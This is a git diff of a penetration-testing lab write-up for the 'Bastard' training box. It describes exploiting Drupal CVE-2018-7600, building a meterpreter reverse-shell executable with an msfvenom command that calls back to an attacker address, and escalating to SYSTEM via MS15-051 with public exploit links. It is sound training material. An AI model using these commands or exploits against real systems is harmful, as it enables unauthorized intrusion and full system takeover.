@@ -1,5 +1,7 @@
 # Bastard – Please keep things updated!
 
+<img src="https://img-9gag-fun.9cache.com/photo/az2wrBB_460s.jpg" width=400>
+
 
 ## Introduction
 This machine was a challenge box for the class Windows Privilege Escalation by TCM, done in preparation for the Practical Network Penetration Tester certification. In it a CMS vulnerability is highlighted for initial exploit and a privilege escalation technique is used which is the main goal of this box.
@@ -11,36 +13,63 @@ Through enumeration a webpage/site was found using the well know CMS Drupal. Inv
 ## Initial Access
 Utilizing Nmap, there were only a few open ports found on the system. Further investigation of the website open on port 80 revealed a website using Drupal in its creation. Combining this information with the robots.txt file’s disallowed entry of “/changelog.txt” reveals the exact version in use.
 
-(image nmap)
+![image](https://github.com/CySec-adin/Holy-Order/assets/150164688/ecb19608-3750-4961-bff0-ca8cfaea572b)
 
-(image changelog.txt)
+![image](https://github.com/CySec-adin/Holy-Order/assets/150164688/3659eaea-859d-4c04-aa55-3364620aabed)
 
 With the exact Drupal version, an exploit was found that worked for it, utilizing a python script that performs a RCE on the system without any authentication required. The proof-of-concept code used to exploit the system resides here: https://github.com/pimps/CVE-2018-7600
 Test commands were run before the exploit was used to download a reverse shell and execute for low level access to the system.
 
-(image test commands)
+![image](https://github.com/CySec-adin/Holy-Order/assets/150164688/8ad32998-116d-481d-89af-00c92a47117b)
 
-(image shell exploit)
+![image](https://github.com/CySec-adin/Holy-Order/assets/150164688/987d7ad7-2953-4e02-b6a8-5d1f3eb67b83)
+
+![image](https://github.com/CySec-adin/Holy-Order/assets/150164688/bcbe337f-cacc-4ee6-94f8-5e47cab12aa7)
+
+![image](https://github.com/CySec-adin/Holy-Order/assets/150164688/8fa395e0-6569-4403-ad79-c6804d292047)
 
 NOTE: meterpreter shell was used in exploit created using the command:
 
-‘’’
+```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=(attackIP) LPORT=(attackerPort) -f exe -o program.exe
-‘’’
+```
 
 
 ## Privilege Escalation
 
 With meterpreter access to the system, the Local Exploit Suggester module of Metasploit was utilized to find potential vulnerabilities to escalate privileges with.
 
-(image local_exploit_suggester)
+```
+[*] 10.129.180.193 - Valid modules for session 2:
+============================
 
-From this list of potential vulnerabilities the Pentester attempted to use the Metasploit modules suggested without success, but was able to find a compiled exploit that allowed for elevated command execution from github that was successful using the vulnerability MS15-051.
+ #   Name                                                           Potentially Vulnerable?  Check Result
+ -   ----                                                           -----------------------  ------------
+ 1   exploit/windows/local/bypassuac_dotnet_profiler                Yes                      The target appears to be vulnerable.
+ 2   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
+ 3   exploit/windows/local/bypassuac_sdclt                          Yes                      The target appears to be vulnerable.
+ 4   exploit/windows/local/cve_2019_1458_wizardopium                Yes                      The target appears to be vulnerable.
+ 5   exploit/windows/local/cve_2020_1054_drawiconex_lpe             Yes                      The target appears to be vulnerable.
+ 6   exploit/windows/local/ms10_092_schelevator                     Yes                      The service is running, but could not be validated.
+ 7   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
+ 8   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
+ 9   exploit/windows/local/ms16_014_wmi_recv_notif                  Yes                      The target appears to be vulnerable.
+ 10  exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
+ 11  exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
+```
+
+From this list of potential vulnerabilities the Pentester attempted to use the Metasploit modules suggested without success, but was able to find a compiled exploit that allowed for elevated command execution from github that was successful using the vulnerability MS15-051. Compiled exploit was found here: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051
+
 As with the previous Drupal exploit, test commands were run before being used in the exact same way to execute a reverse shell that gave elevated access as nt authority/system.
 
-(images of exploit and shell access)
+![image](https://github.com/CySec-adin/Holy-Order/assets/150164688/8f63ad14-4cbf-4afc-875b-4b0f4a4d1113)
 
-(images of blurred flags)
+![image](https://github.com/CySec-adin/Holy-Order/assets/150164688/70f6c02b-d56e-4611-8e14-71888d48f1fc)
+
+
+![image](https://github.com/CySec-adin/Holy-Order/assets/150164688/fd6ce1ac-7c43-43c6-8ac3-00c5c0067113)
+
+![image](https://github.com/CySec-adin/Holy-Order/assets/150164688/3509020f-883e-4d45-9401-79f203f718e3)
 
 
 ## Suggested Mitigations and Remediations
